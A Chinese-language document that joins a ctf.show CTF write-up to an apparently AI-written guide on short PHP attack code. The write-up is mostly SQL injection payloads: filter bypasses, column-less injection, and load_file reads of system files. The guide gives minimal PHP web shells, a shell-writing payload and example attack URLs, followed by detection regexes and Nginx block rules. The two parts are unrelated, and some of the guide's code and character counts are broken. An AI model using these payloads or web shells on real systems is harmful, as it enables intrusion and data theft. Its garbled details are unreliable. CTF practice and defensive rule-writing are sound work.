```html
<?php  
include("secret.php");  
  
if(isset($_GET['c'])){    $c = intval($_GET['c']);    sleep($c);  
    switch ($c) {  
        case 1:  
            echo '$url';  
            break;  
        case 2:  
            echo '@A@';  
            break;  
        case 555555:  
            echo $url;  
        case 44444:  
            echo "@A@";  
            break;  
        case 3333:  
            echo $url;  
            break;  
        case 222:  
            echo '@A@';  
            break;  
        case 222:  
            echo '@A@';  
            break;  
        case 3333:  
            echo $url;  
            break;  
        case 44444:  
            echo '@A@';  
        case 555555:  
            echo $url;  
            break;  
        case 3:  
            echo '@A@';  
        case 6000000:  
            echo "$url";  
        case 1:  
            echo '@A@';  
            break;  
    }  
}  
  
highlight_file(__FILE__);
```

由源代码，遍历到c=3时，here_1s_your_f1ag.php

```html
@A@here_1s_your_f1ag.php@A@ `<?php   include("secret.php");      if(isset($_GET['c'])){    $c = intval($_GET['c']);    sleep($c);       switch ($c) {           case 1:               echo '$url';               break;           case 2:               echo '@A@';               break;           case 555555:               echo $url;           case 44444:               echo "@A@";               break;           case 3333:               echo $url;               break;           case 222:               echo '@A@';               break;           case 222:               echo '@A@';               break;           case 3333:               echo $url;               break;           case 44444:               echo '@A@';           case 555555:               echo $url;               break;           case 3:               echo '@A@';           case 6000000:               echo "$url";           case 1:               echo '@A@';               break;       }   }      highlight_file(__FILE__);`
```


访问发现 (https://dc6a15da-fca1-4777-8e39-29d574dd6f0c.challenge.ctf.show/here_1s_your_f1ag.php?query=1) 应该有sql注入

访问得提示
```html
<!--

if(preg_match('/information_schema\.tables|information_schema\.columns|linestring| |polygon/is', $_GET['query'])){

die('@A@');

}

-->

</body>

</html>

  

<script>alert('admin')</script>
```


----

// 当c=3时, 没有break语句会继续向下执行

// 得到提示 here_1s_your_f1ag.php

---

// 访问 测试 猜测应该是一个根据用户ID查询用户名的功能

// 猜测SQL语句为:

select username from user where id = #{id}

---

// 测试是否存在注入点

1 （有弹窗有回显）

1' （有弹窗无回显）

1#' （有弹窗有回显）

// 存在注入点

---

// 测试列数

1 order by 1 （无弹窗）

// 猜测某些字符被过滤

// 使用 /**/ 替换空格后再进行测试

1/**/order/**/by/**/1 （有弹窗有回显）

1/**/order/**/by/**/2 （有弹窗无回显）

// 列数为1

---

// 收集数据库相关信息

-1/**/union/**/select/**/database()（web）

-1/**/union/**/select/**/user()（root@localhost）

-1/**/union/**/select/**/version()（10.2.26-MariaDB-log）

-1/**/union/**/select/**/@@version_compile_os（Linux）

---

// --dbs

-1/**/union/**/select(group_concat(schema_name))from(information_schema.schemata)

// information_schema, mysql, performance_schema, web

---

// --tables

-1/**/union/**/select(group_concat(table_name))from(information_schema.tables)where(table_schema='web')（无弹窗）

// 测试发现 information_schema.tables 被过滤

// 使用 mysql.innodb_table_stats 绕过

-1/**/union/**/select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name='web')

// content

---

// --columns

-1/**/union/**/select(group_concat(column_name))from(information_schema.columns)where(table_schema='web'/**/and/**/table_name='content')（无弹窗）

// 测试发现 information_schema.columns 被过滤

// 使用无列名注入

// 依次获取各列的数据

-1/**/union/**/select(group_concat(`1`))from(select/**/1,2,3/**/union/**/select*from(content))vt

-1/**/union/**/select(group_concat(`2`))from(select/**/1,2,3/**/union/**/select*from(content))vt

-1/**/union/**/select(group_concat(`3`))from(select/**/1,2,3/**/union/**/select*from(content))vt

---

1, admin, flag is not here!

2, gtf1y, wow,you can really dance

3, Wow, tell you a secret,secret has a secret...

// Flag 不在数据库中

// 根据提示 tell you a secret,secret has a secret... 和主页中的 include("secret.php")

// 尝试读取 secret.php 文件

---

// 数据库用户为 root, 使用高权限读写注入

// 操作系统为 linux, 中间件为 nginx

// 先读取 nginx 配置文件, 确认下网页根路径

-1/**/union/**/select/**/load_file("/etc/nginx/nginx.conf")

// 确认网页根路径为 /var/www/html

// 读取 secret.php 文件

-1/**/union/**/select/**/load_file("/var/www/html/secret.php")

// 页面源代码中可以看到 file_get_contents('/real_flag_is_here');

// 读取 real_flag_is_here

-1/**/union/**/select/**/load_file("/real_flag_is_here")

ctfshow{d791bc15-c4cc-4cf6-b1cf-922956d245e8}

---

// 得到 Flag


----


根据页面源码得知information_schema.columns和information_schema_tables被过滤了，于是使用schema_auto_increment_columns来代替，table_schema改成database_name,并且只能查询表名，查到表名后，用无列名注入法，类似于select `2` from (select 1,2,3 union select * from xxx)n这个形式，具体用法和解释可以在csdn上搜，查询后发现flag不在数据库里，但提示说secret在secret里，又查询用户权限得知为root，可以使用load_file()，调用select/**/load_file("secret.php")#，得知flag的位置后，再select/**/load_file("/real_flag_is_here")#，成功得到flag。


---




          
我来为您详细介绍PHP中不超过24个字符的攻击代码，并提供多种攻击向量和防护方案。

## PHP短代码攻击向量分析

### 1. 文件包含攻击 (12字符)
```php
<?include$_GET[0];
```
**原理**：利用`include`包含GET参数指定的文件，实现任意文件包含。

### 2. 命令执行攻击 (15字符)
```php
<?=`$_GET[0]`;
```
**原理**：使用反引号执行系统命令，GET参数作为命令执行。

### 3. 代码执行攻击 (16字符)
```php
<?=eval($_GET[0]);
```
**原理**：`eval`函数执行任意PHP代码。

### 4. 文件读取攻击 (18字符)
```php
<?=show_source(0);
```
**原理**：`show_source`或`highlight_file`显示文件源码。

### 5. 变量覆盖攻击 (19字符)
```php
<?extract($_GET);
```
**原理**：`extract`函数将数组键值转为变量，导致变量覆盖。

## 完整攻击代码示例（不超过24字符）

### 方案1：命令执行 (15字符)
```php
<?=`$_GET[0]`;
```
**攻击方式**：
```
http://target.com/vuln.php?0=whoami
```

### 方案2：文件包含 (16字符)
```php
<?include$_GET[0];
```
**攻击方式**：
```
http://target.com/vuln.php?0=/etc/passwd
```

### 方案3：代码执行 (16字符)
```php
<?=eval($_GET[0]);
```
**攻击方式**：
```
http://target.com/vuln.php?0=phpinfo();
```

### 方案4：Session操作 (18字符)
```php
<?session_start($0);
```
**攻击方式**：操纵session数据

### 方案5：变量覆盖 (19字符)
```php
<?extract($_GET);
```
**攻击方式**：覆盖已有变量

## 攻击场景和利用方式

### Web Shell上传
```php
<?=`echo$_GET[0]>.a`;
```
**利用**：写入Web Shell
```
?0=<?php @eval($_POST[cmd]);?>
```

### 数据库操作
```php
<?mysql_connect(0);
```
**利用**：数据库连接测试

### 文件操作
```php
<?copy(0,1);
```
**利用**：文件复制/移动

## 防护方案和代码

### 方案1：输入过滤和验证
```php
<?php
/**
 * 安全输入过滤函数
 * @param mixed $input 用户输入数据
 * @param string $type 过滤类型：cmd, file, code
 * @return mixed 过滤后的安全数据
 */
function safe_input($input, $type = 'general') {
    $patterns = [
        'cmd' => '/[^a-zA-Z0-9_\-\s\.\/]/',
        'file' => '/\.\.|\/\/|[\x00-\x1f\x7f-\xff]/',
        'code' => '/eval|system|exec|passthru|shell_exec|`|\$|\{|\}|\(|\)|\[|\]|\'|\"|\\\|\.\./'
    ];
    
    if (isset($patterns[$type])) {
        return preg_replace($patterns[$type], '', $input);
    }
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}
?>
```

### 方案2：PHP配置加固
```php
<?php
// 安全配置检查
ini_set('display_errors', 'Off');
ini_set('allow_url_include', 'Off');
ini_set('allow_url_fopen', 'Off');
ini_set('disable_functions', 'system,exec,passthru,shell_exec,proc_open,popen,eval,assert');
ini_set('open_basedir', '/var/www/html:/tmp');
?>
```

### 方案3：WAF防护规则
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from typing import List, Dict

class PHPAttackDetector:
    """
    PHP短代码攻击检测器
    检测不超过24个字符的PHP攻击代码
    """
    
    def __init__(self):
        # 攻击模式规则库
        self.patterns = {
            'command_execution': [
                r'<\?=`\$_GET\[',
                r'<\?=system\(',
                r'<\?=exec\(',
                r'<\?=passthru\(',
                r'<\?=shell_exec\('
            ],
            'file_inclusion': [
                r'<\?include\$_GET\[',
                r'<\?require\$_GET\[',
                r'<\?include_once\$_GET\[',
                r'<\?require_once\$_GET\['
            ],
            'code_execution': [
                r'<\?=eval\(',
                r'<\?=assert\(',
                r'<\?=create_function\('
            ],
            'variable_override': [
                r'<\?extract\(',
                r'<\?parse_str\(',
                r'<\?\$\w+\s*=\s*\$\w+\['
            ],
            'file_operation': [
                r'<\?copy\(',
                r'<\?move_uploaded_file\(',
                r'<\?file_put_contents\(',
                r'<\?fwrite\('
            ]
        }
    
    def detect_attack(self, code: str) -> Dict:
        """
        检测PHP代码中的攻击向量
        
        参数:
            code (str): 要检测的PHP代码
            
        返回:
            Dict: 检测结果，包含攻击类型和匹配内容
        """
        results = {
            'is_malicious': False,
            'attack_types': [],
            'matched_patterns': [],
            'code_length': len(code)
        }
        
        # 检查代码长度
        if len(code) <= 24:
            results['is_short_code'] = True
        
        # 遍历所有攻击模式
        for attack_type, patterns in self.patterns.items():
            for pattern in patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    results['is_malicious'] = True
                    results['attack_types'].append(attack_type)
                    results['matched_patterns'].append(pattern)
        
        return results
    
    def sanitize_code(self, code: str) -> str:
        """
        清理恶意PHP代码
        
        参数:
            code (str): 要清理的PHP代码
            
        返回:
            str: 清理后的安全代码
        """
        # 移除危险函数调用
        dangerous_functions = [
            'eval', 'system', 'exec', 'passthru', 'shell_exec',
            'proc_open', 'popen', 'assert', 'create_function',
            'extract', 'parse_str', 'include', 'require'
        ]
        
        for func in dangerous_functions:
            pattern = r'' + func + r'\s*\([^)]*\)'
            code = re.sub(pattern, '', code, flags=re.IGNORECASE)
        
        # 移除反引号执行
        code = re.sub(r'`[^`]*`', '', code)
        
        # 移除短标签
        code = re.sub(r'<\?=.*?\?>', '', code)
        code = re.sub(r'<\?.*?\?>', '', code)
        
        return code

# 使用示例
if __name__ == "__main__":
    detector = PHPAttackDetector()
    
    # 测试攻击代码检测
    test_codes = [
        '<?=`$_GET[0]`;',
        '<?include$_GET[0];',
        '<?=eval($_GET[0]);',
        '<?extract($_GET);',
        '<?php echo "Hello"; ?>'  # 正常代码
    ]
    
    for code in test_codes:
        result = detector.detect_attack(code)
        print(f"代码: {code}")
        print(f"检测结果: {result}")
        print("-" * 50)
```

### 方案4：Nginx防护配置
```nginx
# Nginx防护配置
server {
    location ~ \.php$ {
        # 禁止某些User-Agent
        if ($http_user_agent ~* (wget|curl|libwww)) {
            return 403;
        }
        
        # 阻止攻击参数
        if ($query_string ~* "(eval|system|exec|passthru|shell_exec)") {
            return 403;
        }
        
        # 阻止文件包含攻击
        if ($query_string ~* "(\.\./|\.\.\\|\.\.|~/)") {
            return 403;
        }
        
        # 限制请求体大小
        client_max_body_size 1m;
    }
}
```

## 防护策略对比

| 防护方案 | 优点 | 缺点 | 适用场景 |
|----------|------|------|----------|
| **输入过滤** | 精确控制、可定制 | 需要开发工作量 | 所有Web应用 |
| **PHP配置** | 全局生效、无需代码修改 | 可能影响正常功能 | 服务器级别 |
| **WAF防护** | 独立于应用、实时防护 | 需要额外资源 | 高安全需求 |
| **Nginx配置** | 网络层防护、高性能 | 配置复杂 | 反向代理环境 |

## 最佳实践建议

1. **禁用危险函数**：在php.ini中禁用`eval`, `system`, `exec`等函数
2. **关闭短标签**：`short_open_tag = Off`
3. **输入验证**：对所有用户输入进行严格过滤
4. **最小权限**：Web服务器以低权限用户运行
5. **定期更新**：保持PHP和Web服务器最新版本
6. **日志监控**：监控异常访问模式

## 应急响应措施

如果发现攻击，立即：
1. 隔离受影响的系统
2. 分析攻击向量和影响范围
3. 修复漏洞
4. 重置所有密码和密钥
5. 加强监控和审计

这些防护方案可以帮助您有效防御PHP短代码攻击。您可以根据具体需求选择合适的防护策略。
        